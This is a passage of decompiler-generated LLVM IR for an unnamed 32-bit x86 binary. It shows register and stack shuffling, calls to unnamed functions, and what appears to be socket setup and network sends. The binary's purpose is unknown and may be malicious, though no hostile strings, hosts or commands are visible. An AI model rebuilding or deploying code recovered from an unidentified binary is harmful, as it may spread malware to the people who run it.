  %v0_804f2ec = load i32, i32* @esp, align 4
  %v1_804f2ec = add i32 %v0_804f2ec, -4
  %v2_804f2ec = inttoptr i32 %v1_804f2ec to i32*
  store i32 16384, i32* %v2_804f2ec, align 4
  %v1_804f2f1 = add i32 %v0_804f2ec, -8
  %v2_804f2f1 = inttoptr i32 %v1_804f2f1 to i32*
  store i32 2, i32* %v2_804f2f1, align 4
  %v1_804f2f3 = add i32 %v0_804f2ec, -12
  %v2_804f2f3 = inttoptr i32 %v1_804f2f3 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052b8a.25 to i32), i32* %v2_804f2f3, align 4
  %v0_804f2f8 = load i32, i32* @edi, align 4
  %v1_804f2f8 = add i32 %v0_804f2f8, 4
  %v2_804f2f8 = inttoptr i32 %v1_804f2f8 to i32*
  %v3_804f2f8 = load i32, i32* %v2_804f2f8, align 4
  store i32 %v3_804f2f8, i32* %ecx.global-to-local, align 4
  %v2_804f2fb = add i32 %v0_804f2ec, -16
  %v3_804f2fb = inttoptr i32 %v2_804f2fb to i32*
  store i32 %v3_804f2f8, i32* %v3_804f2fb, align 4
  %v0_804f2fc = call i32 @function_8050966()
  store i32 %v0_804f2fc, i32* %eax.global-to-local, align 4
  %v0_804f304 = load i32, i32* @edi, align 4
  %v1_804f304 = add i32 %v0_804f304, 12
  %v2_804f304 = inttoptr i32 %v1_804f304 to i32*
  store i32 4, i32* %v2_804f304, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804f310:                             ; preds = %dec_label_pc_804f1ff
  %v0_804f310 = load i32, i32* @esp, align 4
  %v1_804f313 = add i32 %v0_804f310, -16
  %v2_804f313 = inttoptr i32 %v1_804f313 to i32*
  store i32 26, i32* %v2_804f313, align 4
  %v0_804f315 = call i32 @function_804f6c0()
  store i32 %v0_804f315, i32* %eax.global-to-local, align 4
  %v0_804f31a = load i32, i32* @esp, align 4
  %v1_804f31a = inttoptr i32 %v0_804f31a to i32*
  store i32 27, i32* %v1_804f31a, align 4
  %v0_804f321 = call i32 @function_804f6c0()
  store i32 %v0_804f321, i32* %eax.global-to-local, align 4
  %v0_804f326 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f2c7

dec_label_pc_804f32b:                             ; preds = %dec_label_pc_804ed08
  store i32 %v0_804f32b, i32* @eax, align 4
  %v0_804f32d = call i32 @function_804ddf0()
  store i32 %v0_804f32d, i32* %eax.global-to-local, align 4
  %v0_804f332 = load i32, i32* @esp, align 4
  %v1_804f332 = add i32 %v0_804f332, 32
  %v2_804f332 = inttoptr i32 %v1_804f332 to i32*
  store i32 -1, i32* %v2_804f332, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804f33f:                             ; preds = %dec_label_pc_804f0c9
  %v0_804f33f = load i32, i32* @esp, align 4
  %v1_804f342 = add i32 %v0_804f33f, -16
  %v2_804f342 = inttoptr i32 %v1_804f342 to i32*
  store i32 25, i32* %v2_804f342, align 4
  %v0_804f344 = call i32 @function_804f6c0()
  store i32 %v0_804f344, i32* %eax.global-to-local, align 4
  %v0_804f349 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f138

dec_label_pc_804f351:                             ; preds = %dec_label_pc_804eccb
  store i32 9, i32* %v1_804f35b, align 4
  %v0_804f362 = call i32 @function_804f740()
  store i32 %v0_804f362, i32* %eax.global-to-local, align 4
  %v0_804f367 = load i32, i32* @esp, align 4
  %v1_804f367 = inttoptr i32 %v0_804f367 to i32*
  %v3_804f367 = add i32 %v0_804f367, 4
  %v1_804f368 = inttoptr i32 %v3_804f367 to i32*
  %v1_804f369 = add i32 %v0_804f367, 1880
  store i32 %v1_804f369, i32* %eax.global-to-local, align 4
  store i32 %v1_804f369, i32* %v1_804f368, align 4
  store i32 9, i32* %v1_804f367, align 4
  %v0_804f373 = call i32 @function_804f690()
  store i32 %v0_804f373, i32* %eax.global-to-local, align 4
  %v0_804f378 = load i32, i32* @esp, align 4
  %v1_804f378 = add i32 %v0_804f378, 1880
  %v2_804f378 = inttoptr i32 %v1_804f378 to i32*
  %v3_804f378 = load i32, i32* %v2_804f378, align 4
  %v1_804f37f = add i32 %v3_804f378, -1
  store i32 %v1_804f37f, i32* %edx.global-to-local, align 4
  %v2_804f380 = add i32 %v0_804f378, -4
  %v3_804f380 = inttoptr i32 %v2_804f380 to i32*
  store i32 %v1_804f37f, i32* %v3_804f380, align 4
  %v2_804f381 = add i32 %v0_804f378, -8
  %v3_804f381 = inttoptr i32 %v2_804f381 to i32*
  store i32 %v0_804f373, i32* %v3_804f381, align 4
  %v0_804f382 = load i32, i32* @edi, align 4
  %v1_804f382 = add i32 %v0_804f382, 24
  %v2_804f382 = inttoptr i32 %v1_804f382 to i32*
  %v3_804f382 = load i32, i32* %v2_804f382, align 4
  store i32 %v3_804f382, i32* @esi, align 4
  %v2_804f385 = add i32 %v0_804f378, -12
  %v3_804f385 = inttoptr i32 %v2_804f385 to i32*
  store i32 %v3_804f382, i32* %v3_804f385, align 4
  %v1_804f386 = add i32 %v0_804f378, 32
  %v2_804f386 = inttoptr i32 %v1_804f386 to i32*
  %v3_804f386 = load i32, i32* %v2_804f386, align 4
  store i32 %v3_804f386, i32* @ebx, align 4
  %v2_804f38a = add i32 %v0_804f378, -16
  %v3_804f38a = inttoptr i32 %v2_804f38a to i32*
  store i32 %v3_804f386, i32* %v3_804f38a, align 4
  %v0_804f38b = call i32 @function_804fdc0()
  store i32 %v0_804f38b, i32* %eax.global-to-local, align 4
  %v1_804f390 = load i32, i32* @esp, align 4
  %v2_804f390 = add i32 %v1_804f390, 64
  %v3_804f390 = inttoptr i32 %v2_804f390 to i32*
  store i32 %v0_804f38b, i32* %v3_804f390, align 4
  %v0_804f394 = load i32, i32* @esp, align 4
  %v1_804f397 = add i32 %v0_804f394, 16
  %v2_804f397 = inttoptr i32 %v1_804f397 to i32*
  store i32 9, i32* %v2_804f397, align 4
  %v0_804f399 = call i32 @function_804f6c0()
  store i32 %v0_804f399, i32* %eax.global-to-local, align 4
  %v0_804f39e = load i32, i32* @esp, align 4
  %v1_804f3a1 = add i32 %v0_804f39e, 48
  %v2_804f3a1 = inttoptr i32 %v1_804f3a1 to i32*
  %v3_804f3a1 = load i32, i32* %v2_804f3a1, align 4
  %v13_804f3a1 = icmp eq i32 %v3_804f3a1, -1
  br i1 %v13_804f3a1, label %dec_label_pc_804e9cc.backedge, label %dec_label_pc_804f3ac

dec_label_pc_804f3ac:                             ; preds = %dec_label_pc_804f351
  %v1_804f39e = add i32 %v0_804f39e, 16
  store i32 %v3_804f3a1, i32* %ecx.global-to-local, align 4
  %tmp124 = icmp slt i32 %v3_804f3a1, 1
  br i1 %tmp124, label %dec_label_pc_804f038, label %dec_label_pc_804f3b8

dec_label_pc_804f3b8:                             ; preds = %dec_label_pc_804f3ac
  %v0_804f3b8 = load i32, i32* @edi, align 4
  %v1_804f3b8 = inttoptr i32 %v0_804f3b8 to i32*
  %v2_804f3b8 = load i32, i32* %v1_804f3b8, align 4
  store i32 %v2_804f3b8, i32* %edx.global-to-local, align 4
  %v1_804f3ba = add i32 %v0_804f3b8, 16
  %v2_804f3ba = inttoptr i32 %v1_804f3ba to i32*
  %v3_804f3ba = load i32, i32* %v2_804f3ba, align 4
  store i32 %v3_804f3ba, i32* %eax.global-to-local, align 4
  %v2_804f3bd = add i32 %v0_804f39e, 52
  %v3_804f3bd = inttoptr i32 %v2_804f3bd to i32*
  store i32 %v2_804f3b8, i32* %v3_804f3bd, align 4
  %v0_804f3c1 = load i32, i32* @edi, align 4
  %v1_804f3c1 = add i32 %v0_804f3c1, 20
  %v2_804f3c1 = inttoptr i32 %v1_804f3c1 to i32*
  %v3_804f3c1 = load i32, i32* %v2_804f3c1, align 4
  store i32 %v3_804f3c1, i32* %edx.global-to-local, align 4
  %v0_804f3c4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f3c4 = load i32, i32* @esp, align 4
  %v2_804f3c4 = add i32 %v1_804f3c4, 1872
  %v3_804f3c4 = inttoptr i32 %v2_804f3c4 to i32*
  store i32 %v0_804f3c4, i32* %v3_804f3c4, align 4
  %v0_804f3cb = load i32, i32* %edx.global-to-local, align 4
  %v1_804f3cb = trunc i32 %v0_804f3cb to i16
  %v2_804f3cb = load i32, i32* @esp, align 4
  %v3_804f3cb = add i32 %v2_804f3cb, 1882
  %v4_804f3cb = inttoptr i32 %v3_804f3cb to i16*
  store i16 %v1_804f3cb, i16* %v4_804f3cb, align 2
  %v0_804f3d3 = call i32 @function_8050261()
  store i32 %v0_804f3d3, i32* %eax.global-to-local, align 4
  %tmp125 = icmp slt i32 %v0_804f3d3, 1
  br i1 %tmp125, label %dec_label_pc_804f4e3, label %dec_label_pc_804f3e0

dec_label_pc_804f3e0:                             ; preds = %dec_label_pc_804f4e3, %dec_label_pc_804f3b8, %dec_label_pc_804f523
  %v0_804f3e0 = load i32, i32* @esp, align 4
  %v0_804f3e3 = load i32, i32* @edi, align 4
  %v1_804f3e3 = add i32 %v0_804f3e3, 4
  %v2_804f3e3 = inttoptr i32 %v1_804f3e3 to i32*
  %v3_804f3e3 = load i32, i32* %v2_804f3e3, align 4
  store i32 %v3_804f3e3, i32* %eax.global-to-local, align 4
  %v2_804f3e6 = add i32 %v0_804f3e0, -16
  %v3_804f3e6 = inttoptr i32 %v2_804f3e6 to i32*
  store i32 %v3_804f3e3, i32* %v3_804f3e6, align 4
  %v1_804f3e7 = call i32 @function_8050233(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f3e7, i32* %eax.global-to-local, align 4
  %v0_804f3ef = load i32, i32* @edi, align 4
  %v1_804f3ef = add i32 %v0_804f3ef, 4
  %v2_804f3ef = inttoptr i32 %v1_804f3ef to i32*
  store i32 -1, i32* %v2_804f3ef, align 4
  %v0_804f3f6 = load i32, i32* @edi, align 4
  %v1_804f3f6 = add i32 %v0_804f3f6, 12
  %v2_804f3f6 = inttoptr i32 %v1_804f3f6 to i32*
  store i32 0, i32* %v2_804f3f6, align 4
  br label %dec_label_pc_804ed51

dec_label_pc_804f402:                             ; preds = %dec_label_pc_804ef8e
  %v1_804f402 = add i32 %v0_804ef7a, 32
  %v2_804f402 = inttoptr i32 %v1_804f402 to i32*
  %v3_804f402 = load i32, i32* %v2_804f402, align 4
  %v1_804f406 = add i32 %v0_804ef81, 3
  store i32 %v1_804f406, i32* @ebx, align 4
  %v1_804f409 = add i32 %v3_804f402, 3
  store i32 %v1_804f409, i32* %v2_804f402, align 4
  %v0_804f410 = load i32, i32* @esp, align 4
  %v1_804f410 = add i32 %v0_804f410, -4
  %v2_804f410 = inttoptr i32 %v1_804f410 to i32*
  store i32 16384, i32* %v2_804f410, align 4
  %v1_804f415 = add i32 %v0_804f410, -8
  %v2_804f415 = inttoptr i32 %v1_804f415 to i32*
  store i32 3, i32* %v2_804f415, align 4
  %v1_804f417 = add i32 %v0_804f410, 1879
  store i32 %v1_804f417, i32* %eax.global-to-local, align 4
  %v2_804f41e = add i32 %v0_804f410, -12
  %v3_804f41e = inttoptr i32 %v2_804f41e to i32*
  store i32 %v1_804f417, i32* %v3_804f41e, align 4
  %v0_804f41f = load i32, i32* @edi, align 4
  %v1_804f41f = add i32 %v0_804f41f, 4
  %v2_804f41f = inttoptr i32 %v1_804f41f to i32*
  %v3_804f41f = load i32, i32* %v2_804f41f, align 4
  store i32 %v3_804f41f, i32* %eax.global-to-local, align 4
  %v2_804f422 = add i32 %v0_804f410, -16
  %v3_804f422 = inttoptr i32 %v2_804f422 to i32*
  store i32 %v3_804f41f, i32* %v3_804f422, align 4
  %v0_804f423 = call i32 @function_8050966()
  %v0_804f428 = load i32, i32* @esp, align 4
  %v1_804f428 = add i32 %v0_804f428, -4
  %v2_804f428 = inttoptr i32 %v1_804f428 to i32*
  store i32 16384, i32* %v2_804f428, align 4
  %v1_804f42d = add i32 %v0_804f428, -8
  %v2_804f42d = inttoptr i32 %v1_804f42d to i32*
  store i32 9, i32* %v2_804f42d, align 4
  %v1_804f42f = add i32 %v0_804f428, 1863
  store i32 %v1_804f42f, i32* %eax.global-to-local, align 4
  %v2_804f436 = add i32 %v0_804f428, -12
  %v3_804f436 = inttoptr i32 %v2_804f436 to i32*
  store i32 %v1_804f42f, i32* %v3_804f436, align 4
  %v0_804f437 = load i32, i32* @edi, align 4
  %v1_804f437 = add i32 %v0_804f437, 4
  %v2_804f437 = inttoptr i32 %v1_804f437 to i32*
  %v3_804f437 = load i32, i32* %v2_804f437, align 4
  store i32 %v3_804f437, i32* %eax.global-to-local, align 4
  %v2_804f43a = add i32 %v0_804f428, -16
  %v3_804f43a = inttoptr i32 %v2_804f43a to i32*
  store i32 %v3_804f437, i32* %v3_804f43a, align 4
  %v0_804f43b = call i32 @function_8050966()
  store i32 %v0_804f43b, i32* %eax.global-to-local, align 4
  %v0_804f440 = load i32, i32* @esp, align 4
  %v1_804f440 = add i32 %v0_804f440, 32
  %v0_804f443 = load i32, i32* @edi, align 4
  %v1_804f443 = add i32 %v0_804f443, 24
  %v2_804f443 = inttoptr i32 %v1_804f443 to i32*
  %v3_804f443 = load i32, i32* %v2_804f443, align 4
  store i32 %v3_804f443, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ea61.backedge

dec_label_pc_804ea61.backedge:                    ; preds = %dec_label_pc_804f402, %dec_label_pc_804eef6
  %v0_804ea61 = phi i32 [ %v1_804f440, %dec_label_pc_804f402 ], [ %v0_804ea61.pre, %dec_label_pc_804eef6 ]
  %v4_804ea61.be = phi i32 [ %v3_804f443, %dec_label_pc_804f402 ], [ %v4_804ea61.pre.pre, %dec_label_pc_804eef6 ]
  %v1_804ea61 = add i32 %v0_804ea61, 32
  %v2_804ea61 = inttoptr i32 %v1_804ea61 to i32*
  %v3_804ea61 = load i32, i32* %v2_804ea61, align 4
  %v5_804ea61 = sub i32 %v3_804ea61, %v4_804ea61.be
  %v11_804ea61 = xor i32 %v3_804ea61, %v4_804ea61.be
  %v12_804ea61 = xor i32 %v5_804ea61, %v3_804ea61
  %v13_804ea61 = and i32 %v12_804ea61, %v11_804ea61
  %v14_804ea61 = icmp slt i32 %v13_804ea61, 0
  %v16_804ea61 = icmp slt i32 %v5_804ea61, 0
  %v2_804ea65 = icmp eq i1 %v16_804ea61, %v14_804ea61
  br i1 %v2_804ea65, label %dec_label_pc_804eae3, label %dec_label_pc_804ea67.preheader

dec_label_pc_804f44b:                             ; preds = %dec_label_pc_804f273
  %v0_804f44b = load i32, i32* @esp, align 4
  %v1_804f44e = add i32 %v0_804f44b, -16
  %v2_804f44e = inttoptr i32 %v1_804f44e to i32*
  store i32 26, i32* %v2_804f44e, align 4
  %v0_804f450 = call i32 @function_804f6c0()
  store i32 %v0_804f450, i32* %eax.global-to-local, align 4
  %v0_804f455 = load i32, i32* @esp, align 4
  %v1_804f455 = inttoptr i32 %v0_804f455 to i32*
  store i32 27, i32* %v1_804f455, align 4
  %v0_804f45c = call i32 @function_804f6c0()
  store i32 %v0_804f45c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e9cc.backedge

dec_label_pc_804e9cc.backedge:                    ; preds = %dec_label_pc_804f0d5, %dec_label_pc_804f038, %dec_label_pc_804ea42, %dec_label_pc_804ee79, %dec_label_pc_804ee3b, %dec_label_pc_804edbe, %dec_label_pc_804ed80, %dec_label_pc_804f351, %dec_label_pc_804ec4e, %dec_label_pc_804ec10, %dec_label_pc_804f182, %dec_label_pc_804ebc5, %dec_label_pc_804f050, %dec_label_pc_804eb80, %dec_label_pc_804f120, %dec_label_pc_804f2a3, %dec_label_pc_804ee64, %dec_label_pc_804ec02, %dec_label_pc_804eda9, %dec_label_pc_804ec39, %dec_label_pc_804ebbd, %dec_label_pc_804f44b
  %v0_804e9cc = load i32, i32* @edi, align 4
  %v1_804e9cc = add i32 %v0_804e9cc, 12
  %v2_804e9cc = inttoptr i32 %v1_804e9cc to i32*
  %v3_804e9cc = load i32, i32* %v2_804e9cc, align 4
  store i32 %v3_804e9cc, i32* %eax.global-to-local, align 4
  %v1_804e9cf = icmp eq i32 %v3_804e9cc, 0
  br i1 %v1_804e9cf, label %dec_label_pc_804e8dd, label %dec_label_pc_804e9cc.backedge.dec_label_pc_804e9d7_crit_edge

dec_label_pc_804e9cc.backedge.dec_label_pc_804e9d7_crit_edge: ; preds = %dec_label_pc_804e9cc.backedge
  %v1_804e9da.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e9d7

dec_label_pc_804f469:                             ; preds = %dec_label_pc_804e9a2, %dec_label_pc_804e96c
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f46b

dec_label_pc_804f46b:                             ; preds = %dec_label_pc_804e9b4, %dec_label_pc_804f469
  %v0_804f46e = phi i32 [ 0, %dec_label_pc_804f469 ], [ %v0_804e9a3, %dec_label_pc_804e9b4 ]
  %v0_804f46b = load i32, i32* @edi, align 4
  %v1_804f46b = add i32 %v0_804f46b, 4
  %v2_804f46b = inttoptr i32 %v1_804f46b to i32*
  %v3_804f46b = load i32, i32* %v2_804f46b, align 4
  store i32 %v3_804f46b, i32* %ecx.global-to-local, align 4
  %v2_804f46e = inttoptr i32 %v0_804f46b to i32*
  store i32 %v0_804f46e, i32* %v2_804f46e, align 4
  %v0_804f470 = load i32, i32* @edi, align 4
  %v1_804f470 = add i32 %v0_804f470, 24
  %v2_804f470 = inttoptr i32 %v1_804f470 to i32*
  store i32 0, i32* %v2_804f470, align 4
  %v0_804e8c2.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804e8ca.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e8c2

dec_label_pc_804f47c:                             ; preds = %dec_label_pc_804efaa
  %v1_804f47c = add i32 %v0_804ea15, 56
  %v2_804f47c = inttoptr i32 %v1_804f47c to i32*
  %v3_804f47c = load i32, i32* %v2_804f47c, align 4
  store i32 %v3_804f47c, i32* %eax.global-to-local, align 4
  %v1_804f480 = inttoptr i32 %v3_804f47c to i32*
  store i32 104, i32* %v1_804f480, align 4
  %v0_804efc6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804efc6

dec_label_pc_804f48b:                             ; preds = %dec_label_pc_804efc6
  store i32 %v0_804f48b, i32* @eax, align 4
  %v0_804f48d = call i32 @function_804ddf0()
  store i32 %v0_804f48d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8dd

dec_label_pc_804f497:                             ; preds = %dec_label_pc_804e926
  %v0_804f49a = load i32, i32* @edi, align 4
  %v1_804f49a = add i32 %v0_804f49a, 4
  %v2_804f49a = inttoptr i32 %v1_804f49a to i32*
  %v3_804f49a = load i32, i32* %v2_804f49a, align 4
  store i32 %v3_804f49a, i32* %eax.global-to-local, align 4
  %v2_804f49d = add i32 %v0_804e95c, 16
  %v3_804f49d = inttoptr i32 %v2_804f49d to i32*
  store i32 %v3_804f49a, i32* %v3_804f49d, align 4
  %v1_804f49e = call i32 @function_8050233(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f49e, i32* %eax.global-to-local, align 4
  %v0_804f4a6 = load i32, i32* @edi, align 4
  %v1_804f4a6 = add i32 %v0_804f4a6, 4
  %v2_804f4a6 = inttoptr i32 %v1_804f4a6 to i32*
  store i32 -1, i32* %v2_804f4a6, align 4
  %v0_804f4ad = load i32, i32* @edi, align 4
  %v1_804f4ad = add i32 %v0_804f4ad, 284
  %v2_804f4ad = inttoptr i32 %v1_804f4ad to i8*
  store i8 0, i8* %v2_804f4ad, align 1
  %v0_804f4b4 = load i32, i32* @edi, align 4
  %v1_804f4b4 = add i32 %v0_804f4b4, 12
  %v2_804f4b4 = inttoptr i32 %v1_804f4b4 to i32*
  store i32 0, i32* %v2_804f4b4, align 4
  br label %dec_label_pc_804e8dd

dec_label_pc_804f4c0:                             ; preds = %dec_label_pc_804e7f5, %dec_label_pc_804e7d5
  %v0_804f4c0 = phi i32 [ %v0_804e7eb, %dec_label_pc_804e7d5 ], [ %v0_804f4c0.pre, %dec_label_pc_804e7f5 ]
  %v1_804f4c0 = add i32 %v0_804f4c0, 284
  %v2_804f4c0 = inttoptr i32 %v1_804f4c0 to i8*
  store i8 0, i8* %v2_804f4c0, align 1
  %v0_804f4c7 = load i32, i32* @ebx, align 4
  %v1_804f4c7 = add i32 %v0_804f4c7, 12
  %v2_804f4c7 = inttoptr i32 %v1_804f4c7 to i32*
  store i32 0, i32* %v2_804f4c7, align 4
  br label %dec_label_pc_804e793

dec_label_pc_804f4d3:                             ; preds = %dec_label_pc_804ef98
  %v11_804f4d3 = icmp eq i8 %v2_804ef98, -5
  %v1_804f4d5 = icmp eq i1 %v11_804f4d3, false
  br i1 %v1_804f4d5, label %dec_label_pc_804ea93, label %dec_label_pc_804f4db

dec_label_pc_804f4db:                             ; preds = %dec_label_pc_804f4d3
  store i8 -3, i8* %v1_804ef98, align 1
  br label %dec_label_pc_804ea93

dec_label_pc_804f4e3:                             ; preds = %dec_label_pc_804f3b8
  %v1_804f4e3 = add i32 %v0_804f3d3, 1
  %v8_804f4e3 = icmp eq i32 %v1_804f4e3, 0
  store i32 %v1_804f4e3, i32* %eax.global-to-local, align 4
  br i1 %v8_804f4e3, label %dec_label_pc_804f3e0, label %dec_label_pc_804f4ea

dec_label_pc_804f4ea:                             ; preds = %dec_label_pc_804f4e3
  %v0_804f4ea = load i32, i32* @ecx, align 4
  %v1_804f4ea = load i32, i32* @esp, align 4
  %v2_804f4ea = add i32 %v1_804f4ea, -4
  %v3_804f4ea = inttoptr i32 %v2_804f4ea to i32*
  store i32 %v0_804f4ea, i32* %v3_804f4ea, align 4
  %v1_804f4eb = add i32 %v1_804f4ea, -8
  %v2_804f4eb = inttoptr i32 %v1_804f4eb to i32*
  store i32 0, i32* %v2_804f4eb, align 4
  %v1_804f4ed = add i32 %v1_804f4ea, -12
  %v2_804f4ed = inttoptr i32 %v1_804f4ed to i32*
  store i32 1, i32* %v2_804f4ed, align 4
  %v1_804f4ef = add i32 %v1_804f4ea, -16
  %v2_804f4ef = inttoptr i32 %v1_804f4ef to i32*
  store i32 2, i32* %v2_804f4ef, align 4
  %v4_804f4f1 = call i32 @function_8050a17(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f4f1, i32* @eax, align 4
  %v0_804f4f6 = load i32, i32* @esp, align 4
  store i32 %v4_804f4f1, i32* @ebp, align 4
  %v10_804f4fb = icmp eq i32 %v4_804f4f1, -1
  %v2_804e5a8 = inttoptr i32 %v0_804f4f6 to i32*
  br i1 %v10_804f4fb, label %dec_label_pc_804e5a5, label %dec_label_pc_804f504

dec_label_pc_804f504:                             ; preds = %dec_label_pc_804f4ea
  store i32 2, i32* %v2_804e5a8, align 4
  %v0_804f509 = call i32 @function_804f740()
  store i32 %v0_804f509, i32* %eax.global-to-local, align 4
  %v0_804f50e = load i32, i32* @esp, align 4
  %v1_804f50e = inttoptr i32 %v0_804f50e to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_8052b02.26 to i32), i32* %v1_804f50e, align 4
  %v0_804f515 = call i32 @function_804d950()
  store i32 %v0_804f515, i32* %eax.global-to-local, align 4
  %v0_804f51a = load i32, i32* @esp, align 4
  store i32 %v0_804f515, i32* @esi, align 4
  %v2_804f51f = icmp eq i32 %v0_804f515, 0
  %v1_804f521 = icmp eq i1 %v2_804f51f, false
  %v1_804f55f = add i32 %v0_804f51a, 1844
  %v2_804f55f = inttoptr i32 %v1_804f55f to i16*
  store i16 2, i16* %v2_804f55f, align 2
  br i1 %v1_804f521, label %dec_label_pc_804f55f, label %dec_label_pc_804f523

dec_label_pc_804f523:                             ; preds = %dec_label_pc_804f504
  %v0_804f52d = load i32, i32* @esp, align 4
  %v1_804f530 = add i32 %v0_804f52d, -16
  %v2_804f530 = inttoptr i32 %v1_804f530 to i32*
  store i32 ptrtoint ([12 x i8]* @global_var_8052b16.27 to i32), i32* %v2_804f530, align 4
  %v0_804f535 = call i32 @function_80507ec()
  store i32 %v0_804f535, i32* %eax.global-to-local, align 4
  %v1_804f53a = load i32, i32* @esp, align 4
  %v2_804f53a = add i32 %v1_804f53a, 1848
  %v3_804f53a = inttoptr i32 %v2_804f53a to i32*
  store i32 %v0_804f535, i32* %v3_804f53a, align 4
  %v0_804f541 = load i32, i32* @esp, align 4
  %v1_804f541 = inttoptr i32 %v0_804f541 to i32*
  %v2_804f541 = load i32, i32* %v1_804f541, align 4
  store i32 %v2_804f541, i32* %eax.global-to-local, align 4
  %v3_804f541 = add i32 %v0_804f541, 4
  %v1_804f542 = inttoptr i32 %v3_804f541 to i32*
  %v2_804f542 = load i32, i32* %v1_804f542, align 4
  store i32 %v2_804f542, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804f542, align 4
  store i32 2, i32* %v1_804f541, align 4
  %v0_804f547 = call i32 @function_804f690()
  %v1_804f547 = inttoptr i32 %v0_804f547 to i16*
  store i32 %v0_804f547, i32* %eax.global-to-local, align 4
  %v3_804f54c = load i16, i16* %v1_804f547, align 2
  %v4_804f54c = zext i16 %v3_804f54c to i32
  %v7_804f54c = and i32 %v0_804f547, -65536
  %v8_804f54c = or i32 %v4_804f54c, %v7_804f54c
  store i32 %v8_804f54c, i32* %eax.global-to-local, align 4
  %v2_804f54f = load i32, i32* @esp, align 4
  %v3_804f54f = add i32 %v2_804f54f, 1846
  %v4_804f54f = inttoptr i32 %v3_804f54f to i16*
  store i16 %v3_804f54c, i16* %v4_804f54f, align 2
  br label %dec_label_pc_804f3e0

dec_label_pc_804f55f:                             ; preds = %dec_label_pc_804f504
  %v2_804f569 = add i32 %v0_804f515, 4
  %v3_804f569 = inttoptr i32 %v2_804f569 to i32*
  %v4_804f569 = load i32, i32* %v3_804f569, align 4
  store i32 %v4_804f569, i32* @ebx, align 4
  %v1_804f56c = call i32 @function_804d6e0(i32 ptrtoint (i32* @0 to i32))
  %v2_804f56c = sext i32 %v1_804f56c to i64
  store i32 %v1_804f56c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804f573 = load i32, i32* @esi, align 4
  %v1_804f573 = inttoptr i32 %v0_804f573 to i8*
  %v2_804f573 = load i8, i8* %v1_804f573, align 1
  %v3_804f573 = zext i8 %v2_804f573 to i32
  store i32 %v3_804f573, i32* %ecx.global-to-local, align 4
  %v8_804f579 = zext i8 %v2_804f573 to i64
  %v9_804f579 = udiv i64 %v2_804f56c, %v8_804f579
  %v10_804f579 = trunc i64 %v9_804f579 to i32
  store i32 %v10_804f579, i32* %eax.global-to-local, align 4
  %v11_804f579 = urem i64 %v2_804f56c, %v8_804f579
  %v12_804f579 = trunc i64 %v11_804f579 to i32
  store i32 %v12_804f579, i32* %edx.global-to-local, align 4
  %v0_804f57b = load i32, i32* @ebx, align 4
  %v2_804f57b = mul nuw nsw i32 %v12_804f579, 4
  %v3_804f57b = add i32 %v2_804f57b, %v0_804f57b
  %v4_804f57b = inttoptr i32 %v3_804f57b to i32*
  %v5_804f57b = load i32, i32* %v4_804f57b, align 4
  store i32 %v5_804f57b, i32* %eax.global-to-local, align 4
  %v1_804f57e = load i32, i32* @esp, align 4
  %v2_804f57e = add i32 %v1_804f57e, 1832
  %v3_804f57e = inttoptr i32 %v2_804f57e to i32*
  store i32 %v5_804f57b, i32* %v3_804f57e, align 4
  %v0_804f585 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f585 = load i32, i32* @esp, align 4
  %v2_804f585 = add i32 %v1_804f585, -4
  %v3_804f585 = inttoptr i32 %v2_804f585 to i32*
  store i32 %v0_804f585, i32* %v3_804f585, align 4
  %v0_804f586 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f586 = add i32 %v1_804f585, -8
  %v3_804f586 = inttoptr i32 %v2_804f586 to i32*
  store i32 %v0_804f586, i32* %v3_804f586, align 4
  %v1_804f587 = add i32 %v1_804f585, -12
  %v2_804f587 = inttoptr i32 %v1_804f587 to i32*
  store i32 0, i32* %v2_804f587, align 4
  %v1_804f589 = add i32 %v1_804f585, -16
  %v2_804f589 = inttoptr i32 %v1_804f589 to i32*
  store i32 2, i32* %v2_804f589, align 4
  %v0_804f58b = call i32 @function_804f690()
  %v1_804f58b = inttoptr i32 %v0_804f58b to i16*
  store i32 %v0_804f58b, i32* %eax.global-to-local, align 4
  %v3_804f590 = load i16, i16* %v1_804f58b, align 2
  %v4_804f590 = zext i16 %v3_804f590 to i32
  %v7_804f590 = and i32 %v0_804f58b, -65536
  %v8_804f590 = or i32 %v4_804f590, %v7_804f590
  store i32 %v8_804f590, i32* %eax.global-to-local, align 4
  %v0_804f593 = load i32, i32* @esi, align 4
  %v1_804f593 = load i32, i32* @esp, align 4
  %v2_804f593 = inttoptr i32 %v1_804f593 to i32*
  store i32 %v0_804f593, i32* %v2_804f593, align 4
  %v0_804f596 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f596 = trunc i32 %v0_804f596 to i16
  %v2_804f596 = load i32, i32* @esp, align 4
  %v3_804f596 = add i32 %v2_804f596, 1846
  %v4_804f596 = inttoptr i32 %v3_804f596 to i16*
  store i16 %v1_804f596, i16* %v4_804f596, align 2
  %v0_804f59e = call i32 @function_804d910()
  store i32 %v0_804f59e, i32* %eax.global-to-local, align 4
  %v0_804f5a3 = load i32, i32* @esp, align 4
  %v1_804f5a3 = inttoptr i32 %v0_804f5a3 to i32*
  store i32 2, i32* %v1_804f5a3, align 4
  %v0_804f5aa = call i32 @function_804f6c0()
  %v0_804f5af = load i32, i32* @esp, align 4
  %v1_804f5af = add i32 %v0_804f5af, 1844
  store i32 %v1_804f5af, i32* %eax.global-to-local, align 4
